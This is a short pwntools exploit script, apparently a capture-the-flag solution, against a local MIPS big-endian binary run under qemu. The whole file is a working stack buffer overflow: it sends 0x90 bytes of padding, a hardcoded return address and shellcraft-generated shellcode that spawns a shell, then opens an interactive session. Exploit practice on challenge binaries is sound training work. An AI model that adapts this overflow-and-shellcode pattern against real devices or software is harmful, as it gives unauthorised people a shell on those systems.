from pwn import *
context(arch="mips",endian="big",log_level="debug")

io = process(['qemu-mips','./pwn'])
#io = process(['qemu-mips','-g','1234','./pwn'])

io.sendlineafter("number: ",b'1')

#payload = b'1:' + cyclic(0x150)
payload = b'1:' 
payload += 0x90*b'a' +p32(0x76fff2b0)+asm(shellcraft.sh())
io.sendlineafter("eg => '1:Job.' ",payload)
io.interactive()
